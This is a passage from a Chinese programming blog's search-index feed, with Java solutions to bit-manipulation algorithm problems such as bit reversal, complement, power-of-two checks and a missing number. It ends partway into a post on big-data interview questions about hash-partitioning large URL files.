ret <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>        ret <span class="token operator">|=</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        n <span class="token operator">>>>=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>如果该函数需要被调用很多次，可以将 int 拆成 4 个 byte，然后缓存 byte 对应的比特位翻转，最后再拼接起来。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> Map<span class="token operator">&lt;</span>Byte<span class="token punctuation">,</span> Integer<span class="token operator">></span> cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">reverseBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ret <span class="token operator">&lt;&lt;=</span> <span class="token number">8</span><span class="token punctuation">;</span>        ret <span class="token operator">|=</span> <span class="token function">reverseByte</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">0b11111111</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        n <span class="token operator">>>=</span> <span class="token number">8</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">private</span> <span class="token keyword">int</span> <span class="token function">reverseByte</span><span class="token punctuation">(</span><span class="token keyword">byte</span> b<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>cache<span class="token punctuation">.</span><span class="token function">containsKey</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> cache<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span> t <span class="token operator">=</span> b<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">8</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ret <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>        ret <span class="token operator">|=</span> t <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">;</span>        t <span class="token operator">>>=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    cache<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>b<span class="token punctuation">,</span> ret<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>求一个数的补码</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/qiu-yi-ge-shu-de-bu-ma/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/qiu-yi-ge-shu-de-bu-ma/</url>
      
        <content type="html"><![CDATA[<h2 id="求一个数的补码"><a href="#求一个数的补码" class="headerlink" title="求一个数的补码"></a>求一个数的补码</h2><p><strong>问题</strong></p><p>给定一个正整数，输出其补数。补码策略是将二进制表示的位翻转。</p><p><strong>注意:</strong></p><ol><li>给定的整数保证在32位有符号整数的范围内。</li><li>你可以假设在整数的二进制表示中没有前导零比特。</li></ol><p><strong>示例 1:</strong></p><pre><code>Input: 5Output: 2Explanation: The binary representation of 5 is 101 (no leading zero bits), and its complement is 010. So you need to output 2.</code></pre><p><strong>示例 2:</strong></p><pre><code>Input: 1Output: 0Explanation: The binary representation of 1 is 1 (no leading zero bits), and its complement is 0. So you need to output 0.</code></pre><p><strong>代码</strong></p><p>题目描述：不考虑二进制表示中的首 0 部分。</p><p>对于 00000101，要求补码可以将它与 00000111 进行异或操作。那么问题就转换为求掩码 00000111。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">findComplement</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mask <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token number">30</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>num <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> mask <span class="token operator">>>=</span> <span class="token number">1</span><span class="token punctuation">;</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> num <span class="token operator">^</span> mask<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>可以利用 Java 的 Integer.highestOneBit() 方法来获得含有首 1 的数。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">findComplement</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mask <span class="token operator">=</span> Integer<span class="token punctuation">.</span><span class="token function">highestOneBit</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    mask <span class="token operator">=</span> <span class="token punctuation">(</span>mask <span class="token operator">&lt;&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> num <span class="token operator">^</span> mask<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>对于 10000000 这样的数要扩展成 11111111，可以利用以下方法：</p><pre class=" language-java"><code class="language-java">mask <span class="token operator">|=</span> mask <span class="token operator">>></span> <span class="token number">1</span>    <span class="token number">11000000</span>mask <span class="token operator">|=</span> mask <span class="token operator">>></span> <span class="token number">2</span>    <span class="token number">11110000</span>mask <span class="token operator">|=</span> mask <span class="token operator">>></span> <span class="token number">4</span>    <span class="token number">11111111</span><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">findComplement</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> mask <span class="token operator">=</span> num<span class="token punctuation">;</span>    mask <span class="token operator">|=</span> mask <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">;</span>    mask <span class="token operator">|=</span> mask <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">;</span>    mask <span class="token operator">|=</span> mask <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">;</span>    mask <span class="token operator">|=</span> mask <span class="token operator">>></span> <span class="token number">8</span><span class="token punctuation">;</span>    mask <span class="token operator">|=</span> mask <span class="token operator">>></span> <span class="token number">16</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>mask <span class="token operator">^</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断一个数是不是4的n次方</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/pan-duan-yi-ge-shu-shi-bu-shi-4-de-n-ci-fang/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/pan-duan-yi-ge-shu-shi-bu-shi-4-de-n-ci-fang/</url>
      
        <content type="html"><![CDATA[<h2 id="判断一个数是不是4的n次方"><a href="#判断一个数是不是4的n次方" class="headerlink" title="判断一个数是不是4的n次方"></a>判断一个数是不是4的n次方</h2><p><strong>问题</strong></p><p>给定一个整数(有符号32位)，编写一个函数来检查它是否是4的幂。</p><p><strong>示例 1:</strong></p><pre><code>Input: 16Output: true</code></pre><p><strong>示例 2:</strong></p><pre><code>Input: 5Output: false</code></pre><p><strong>代码</strong></p><p>这种数在二进制表示中有且只有一个奇数位为 1，例如 16（10000）。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isPowerOfFour</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> num <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>num <span class="token operator">&amp;</span> <span class="token punctuation">(</span>num <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>num <span class="token operator">&amp;</span> <span class="token number">0b01010101010101010101010101010101</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>也可以使用正则表达式进行匹配。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isPowerOfFour</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> Integer<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">matches</span><span class="token punctuation">(</span><span class="token string">"10*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找出数组中缺失的那个数</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/zhao-chu-shu-zu-zhong-que-shi-de-na-ge-shu/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/zhao-chu-shu-zu-zhong-que-shi-de-na-ge-shu/</url>
      
        <content type="html"><![CDATA[<h2 id="找出数组中缺失的那个数"><a href="#找出数组中缺失的那个数" class="headerlink" title="找出数组中缺失的那个数"></a>找出数组中缺失的那个数</h2><p><strong>问题</strong></p><p>这个题目说的是，数组元素在 0-n 之间，但是有一个数是缺失的，要求找到这个缺失的数。</p><pre><code>Input: [3,0,1]Output: 2</code></pre><p><strong>代码</strong></p><p>两个相同的数异或的结果为 0，对所有数进行异或操作，最后的结果就是单独出现的那个数。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">missingNumber</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        ret <span class="token operator">=</span> ret <span class="token operator">^</span> i <span class="token operator">^</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret <span class="token operator">^</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断一个数是不是2的n次方</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/pan-duan-yi-ge-shu-shi-bu-shi-2-de-n-ci-fang/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/pan-duan-yi-ge-shu-shi-bu-shi-2-de-n-ci-fang/</url>
      
        <content type="html"><![CDATA[<h2 id="判断一个数是不是2的n次方"><a href="#判断一个数是不是2的n次方" class="headerlink" title="判断一个数是不是2的n次方"></a>判断一个数是不是2的n次方</h2><p><strong>问题</strong></p><p>给定一个整数，编写一个函数来确定它是否是2的幂。</p><p><strong>示例 1:</strong></p><pre><code>Input: 1Output: true Explanation: 20 = 1</code></pre><p><strong>示例 2:</strong></p><pre><code>Input: 16Output: trueExplanation: 24 = 16</code></pre><p><strong>示例 3:</strong></p><pre><code>Input: 218Output: false</code></pre><p><strong>代码</strong></p><p>二进制表示只有一个 1 存在。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isPowerOfTwo</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> n <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> Integer<span class="token punctuation">.</span><span class="token function">bitCount</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>利用 1000 &amp; 0111 == 0 这种性质，得到以下解法：</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">isPowerOfTwo</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> n <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token punctuation">(</span>n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>位运算-基本原理</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/wei-yun-suan-ji-ben-yuan-li/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/wei-yun-suan-ji-ben-yuan-li/</url>
      
        <content type="html"><![CDATA[<h2 id="位运算-基本原理"><a href="#位运算-基本原理" class="headerlink" title="位运算-基本原理"></a>位运算-基本原理</h2><h3 id="1-基本原理"><a href="#1-基本原理" class="headerlink" title="1. 基本原理"></a><strong>1. 基本原理</strong></h3><p>0s 表示一串 0，1s 表示一串 1。</p><pre><code>x ^ 0s = x      x &amp; 0s = 0      x | 0s = xx ^ 1s = ~x     x &amp; 1s = x      x | 1s = 1sx ^ x = 0       x &amp; x = x       x | x = x</code></pre><ul><li>利用 x ^ 1s = ~x 的特点，可以将位级表示翻转；利用 x ^ x = 0 的特点，可以将三个数中重复的两个数去除，只留下另一个数。</li><li>利用 x &amp; 0s = 0 和 x &amp; 1s = x 的特点，可以实现掩码操作。一个数 num 与 mask：00111100 进行位与操作，只保留 num 中与 mask 的 1 部分相对应的位。</li><li>利用 x | 0s = x 和 x | 1s = 1s 的特点，可以实现设值操作。一个数 num 与 mask：00111100 进行位或操作，将 num 中与 mask 的 1 部分相对应的位都设置为 1。</li></ul><p>位与运算技巧：</p><ul><li>n&amp;(n-1) 去除 n 的位级表示中最低的那一位。例如对于二进制表示 10110 <strong>100</strong> ，减去 1 得到 10110<strong>011</strong>，这两个数相与得到 10110<strong>000</strong>。</li><li>n&amp;(-n) 得到 n 的位级表示中最低的那一位。-n 得到 n 的反码加 1，对于二进制表示 10110 <strong>100</strong> ，-n 得到 01001<strong>100</strong>，相与得到 00000<strong>100</strong>。</li><li>n-n&amp;(~n+1) 去除 n 的位级表示中最高的那一位。</li></ul><p>移位运算：</p><ul><li>>&gt; n 为算术右移，相当于除以 2n；</li><li>>&gt;&gt; n 为无符号右移，左边会补上 0。</li><li>&lt;&lt; n 为算术左移，相当于乘以 2n。</li></ul><h3 id="2-mask-计算"><a href="#2-mask-计算" class="headerlink" title="2. mask 计算"></a><strong>2. mask 计算</strong></h3><p>要获取 111111111，将 0 取反即可，~0。</p><p>要得到只有第 i 位为 1 的 mask，将 1 向左移动 i-1 位即可，1&lt;&lt;(i-1) 。例如 1&lt;&lt;4 得到只有第 5 位为 1 的 mask ：00010000。</p><p>要得到 1 到 i 位为 1 的 mask，(1&lt;&lt;i)-1 即可，例如将 (1&lt;&lt;4)-1 = 00010000-1 = 00001111。</p><p>要得到 1 到 i 位为 0 的 mask，只需将 1 到 i 位为 1 的 mask 取反，即 ~((1&lt;&lt;i)-1)。</p><h3 id="3-Java-中的位操作"><a href="#3-Java-中的位操作" class="headerlink" title="3. Java 中的位操作"></a><strong>3. Java 中的位操作</strong></h3><pre class=" language-java"><code class="language-java"><span class="token keyword">static</span> <span class="token keyword">int</span> Integer<span class="token punctuation">.</span><span class="token function">bitCount</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment" spellcheck="true">// 统计 1 的数量</span><span class="token keyword">static</span> <span class="token keyword">int</span> Integer<span class="token punctuation">.</span><span class="token function">highestOneBit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment" spellcheck="true">// 获得最高位</span><span class="token keyword">static</span> String <span class="token function">toBinaryString</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 转换为二进制表示的字符串</span></code></pre><p>转载自：<a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/Leetcode%20%E9%A2%98%E8%A7%A3.md#%E4%BD%8D%E8%BF%90%E7%AE%97">原文</a></p>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字符串数组最大乘积</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/zi-fu-chuan-shu-zu-zui-da-cheng-ji/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/zi-fu-chuan-shu-zu-zui-da-cheng-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="字符串数组最大乘积"><a href="#字符串数组最大乘积" class="headerlink" title="字符串数组最大乘积"></a>字符串数组最大乘积</h2><p><strong>问题</strong></p><p>题目描述：字符串数组的字符串只含有小写字符。求解字符串数组中两个字符串长度的最大乘积，要求这两个字符串不能含有相同字符。</p><pre><code>Given [&quot;abcw&quot;, &quot;baz&quot;, &quot;foo&quot;, &quot;bar&quot;, &quot;xtfn&quot;, &quot;abcdef&quot;]Return 16The two words can be &quot;abcw&quot;, &quot;xtfn&quot;.</code></pre><p><strong>代码</strong></p><p>本题主要问题是判断两个字符串是否含相同字符，由于字符串只含有小写字符，总共 26 位，因此可以用一个 32 位的整数来存储每个字符是否出现过。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">maxProduct</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> words<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> words<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> val <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">char</span> c <span class="token operator">:</span> words<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            val<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>c <span class="token operator">-</span> <span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">int</span> ret <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>val<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> val<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                ret <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>ret<span class="token punctuation">,</span> words<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> words<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> ret<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>判断一个数的位级表示是否不会出现连续的0和1</title>
      <link href="/2019/01/05/suan-fa/wei-yun-suan/pan-duan-yi-ge-shu-de-wei-ji-biao-shi-shi-fou-bu-hui-chu-xian-lian-xu-de-0-he-1/"/>
      <url>/2019/01/05/suan-fa/wei-yun-suan/pan-duan-yi-ge-shu-de-wei-ji-biao-shi-shi-fou-bu-hui-chu-xian-lian-xu-de-0-he-1/</url>
      
        <content type="html"><![CDATA[<h2 id="判断一个数的位级表示是否不会出现连续的0和1"><a href="#判断一个数的位级表示是否不会出现连续的0和1" class="headerlink" title="判断一个数的位级表示是否不会出现连续的0和1"></a>判断一个数的位级表示是否不会出现连续的0和1</h2><p><strong>问题</strong></p><p>给定一个正整数，检查它是否有交替的位:也就是说，如果两个相邻的位总是有不同的值。</p><p><strong>示例 1:</strong></p><pre><code>Input: 5Output: TrueExplanation:The binary representation of 5 is: 101</code></pre><p><strong>示例 2:</strong></p><pre><code>Input: 7Output: FalseExplanation:The binary representation of 7 is: 111.</code></pre><p><strong>示例 3:</strong></p><pre><code>Input: 11Output: FalseExplanation:The binary representation of 11 is: 1011.</code></pre><p><strong>代码</strong></p><p>对于 1010 这种位级表示的数，把它向右移动 1 位得到 101，这两个数每个位都不同，因此异或得到的结果为 1111。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">hasAlternatingBits</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">^</span> <span class="token punctuation">(</span>n <span class="token operator">>></span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>a <span class="token operator">&amp;</span> <span class="token punctuation">(</span>a <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> 位运算 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>几道大数据面试题</title>
      <link href="/2019/01/04/mian-shi-xi-lie/ji-dao-da-shu-ju-mian-shi-ti/"/>
      <url>/2019/01/04/mian-shi-xi-lie/ji-dao-da-shu-ju-mian-shi-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="几道大数据面试题"><a href="#几道大数据面试题" class="headerlink" title="几道大数据面试题"></a>几道大数据面试题</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>首先处理大数据的面试题，有些基本概念要清楚：</p><p>（1）1Gb = 10^9bytes（1Gb = 10亿字节）：1Gb = 1024Mb，1Mb = 1024Kb，1Kb = 1024bytes；</p><p>（2）基本流程是，分解大问题，解决小问题，从局部最优中选择全局最优；（当然，如果直接放内存里就能解决的话，那就直接想办法求解，不需要分解了。）</p><p>（3）分解过程常用方法：hash(x)%m。其中x为字符串/url/ip，m为小问题的数目，比如把一个大文件分解为1000份，m=1000；</p><p>（4）解决问题辅助数据结构：hash_map，Trie树，bitmap，二叉排序树（AVL，SBT，红黑树）；</p><p>（5）top K问题：最大K个用最小堆，最小K个用最大堆。（至于为什么？自己在纸上写个小栗子，试一下就知道了。）</p><p>（6）处理大数据常用排序：快速排序/堆排序/归并排序/桶排序</p><p>下面是几个例题（每个题的解法都不唯一，下面只列出了众多解法中的一种）：</p><h2 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h2><p><strong>问题</strong></p><p>给定a、b两个文件，各存放50亿个url，每个url各占64字节，内存限制是4G，让你找出a、b文件共同的url？</p><p><strong>解题思路</strong></p><p>假如每个url大小为10bytes，那么可以估计每个文件的大小为50G×64=320G，远远大于内存限制的4G，所以不可能将其完全加载到内存中处理，可以采用分治的思想来解决。</p><p>Step1：遍历文件a，对每个url求取hash(url)%1000，然后根据所取得的值将url分别存储到1000个小文件（记为a0,a1,…,a999 ，每个小文件约300M）；</p><p>Step2: 遍历文件b，采取和a相同的方式将url分别存储到1000个小文件（记为b0,b1,…,b999）；</p><p>巧妙之处：这样处理后，所有可能相同的url都被保存在对应的小文件（a0 vs b0, a1 vs b1 ,…,a999 vs b999）中，不对应的小文件不可能有相同的url。然后我们只要求出这个1000对小文件中相同的url即可。</p><p>Step3：求每对小文件ai和bi中相同的url时，可以把ai的url存储到hash_set/hash_map中。然后遍历bi的每个url，看其是否在刚才构建的hash_set中，如果是，那么就是共同的url，存到文件里面就可以了。</p><p>草图如下（左边分解A，右边分解B，中间求解相同url）：</p><p><a href="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/blob/master/medias/bigdata/1.png"><img src="https://github.com/XuQianJin-Stars/XuQianJin-Stars.github.io/raw/master/medias/bigdata/1.png" alt="img"></a></p><h2 id="题目二"><a href="#题目二" class="headerlink" 